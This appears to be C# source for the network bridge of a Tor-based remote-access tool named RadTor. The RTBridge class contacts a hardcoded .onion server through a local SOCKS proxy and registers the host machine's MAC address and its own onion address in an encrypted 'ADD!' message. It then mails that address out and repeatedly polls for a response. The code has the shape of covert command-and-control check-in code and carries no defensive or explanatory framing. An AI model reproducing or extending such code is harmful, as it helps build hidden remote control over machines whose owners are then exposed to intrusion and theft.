using com.LandonKey.SocksWebProxy;
using com.LandonKey.SocksWebProxy.Proxy;
using LocalRT.radtor.local.core;
using LocalRT.radtor.utils;
using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace LocalRT.Radtor.Remote
{
    class RTBridge
    {
        EncripTOR encrip = new EncripTOR();

        private readonly int MAX_PING = 322;

        private readonly String URL_ONION_SERVER = "http://6rc35f2vx6qn6zdj.onion/RT/IN/";

        private static RTBridge rtBridge { get; set; }

        private RTWebClient webRTClient { get; set; }

        public int rtPort { get;  set; }
        public static string rtOnionUrl { get; private set; }
        //public static IWebProxy proxy { get; private set; }
        
        private RTBridge()
        {
        }

        public void roar(bool ok)
        {
           
            Thread roarThread = new Thread(new ThreadStart(roarRadtor));
            roarThread.Start();
            roarThread.Join();
        }

        public bool sightHeil()
        {
            String localOnionUrl = RadTorUtil.getAbsoluteDomain(rtOnionUrl);
            String hiRadtorServer = encrip.encript("ADD!" + LocalConfiguration.getMac() + "!" + localOnionUrl);
            String urlRadtorRemote = String.Format("{0}{1}", URL_ONION_SERVER, hiRadtorServer);
            RadTorLog.log("Get Data from URL Radtor Server : " + urlRadtorRemote); 
            Uri urlOnionServer = new Uri(urlRadtorRemote);
            String responseServer = getHtml(urlOnionServer);
            if (responseServer != null)
            {
                RadTorLog.log("[+] Respuesta del RADTOR SERVER : " + responseServer);                          
                Thread rtMailThread = new Thread(new ThreadStart(SendRTMail));
                rtMailThread.Start();
                rtMailThread.Join();                
                return true;
            }
            else {
                return false;
            }
        }

        private void SendRTMail()
        {
            RTMail.proxy = getTorProxy();
            RTMail.Send(rtOnionUrl);
        }

        private void roarRadtor()
        {
            Uri url = new Uri(rtOnionUrl);
            string response = null;
            int ping = 0;
            bool sightHeil = false;
            while (response == null)
            {
                if (!sightHeil)
                {
                    sightHeil = this.sightHeil();
                }
                else
                {
                    response = getHtml(url);
                    //if (!ok)
                    //{
                    //    response = "";
                    //}
                    if (response == null)
                    {
                        ping++;
                        Thread.Sleep(10000);
                    }
                    if (ping > MAX_PING)
                    {
                        response = "NOK";
                    }
                }
            }
            EncripTOR encrip = new EncripTOR();
            //response = encrip.decrypt(response);
            RadTorLog.log("respuesta servidor DESDE DEEP WEB:\n" + response);
        }

        public static RTBridge getInstance(string rtOnionUrlParam, int rtPort)
        {
            if (rtBridge == null)
            {
                rtBridge = new RTBridge();
                rtOnionUrl = rtOnionUrlParam;
                rtBridge.rtPort = rtPort;
            }
            return rtBridge;
        }

        private static int GetNextFreePort()
        {
            var listener = new TcpListener(IPAddress.Loopback, 0);
            listener.Start();
            var port = ((IPEndPoint)listener.LocalEndpoint).Port;
            listener.Stop();
            return port;
        }
        public string getHtml(String url) {
            Uri urlOnion = new Uri(url);
            return getHtml(urlOnion);
        }

        public string getHtml(Uri url)
        {
            try
            {
                IWebProxy proxy = getTorProxy();
                webRTClient = new RTWebClient(url.OriginalString, proxy);
                webRTClient.timeOutMin = 2;
                var data = webRTClient.OpenRead(url);
                StreamReader html = new StreamReader(data);
                return html.ReadToEnd();
            }
            catch (Exception e){
                RadTorLog.log("No se pudo obtener respuesta desde url:" + url.OriginalString);
                RadTorLog.log("Error..:" + e.Message);                
                return null;
           }
        }

        private IWebProxy getTorProxy()
        {
            SocksWebProxy proxy = new SocksWebProxy(new ProxyConfig(
                IPAddress.Parse("127.0.0.1"),
                GetNextFreePort(),
                IPAddress.Parse("127.0.0.1"),
                rtPort,
                ProxyConfig.SocksVersion.Four
                //,"","RADTOR"
                ));
            WebRequest.DefaultWebProxy = proxy;
            //bool OK = false;
            //try
            //{
            //    WebClient wc = new WebClient();
            //    wc.Proxy = new WebProxy("127.0.0.1", rtPort);
            //    wc.DownloadString("http://google.com/ncr");
            //    OK = true;
            //}
            //catch { OK = false; }

            return proxy;
        }
    }
}
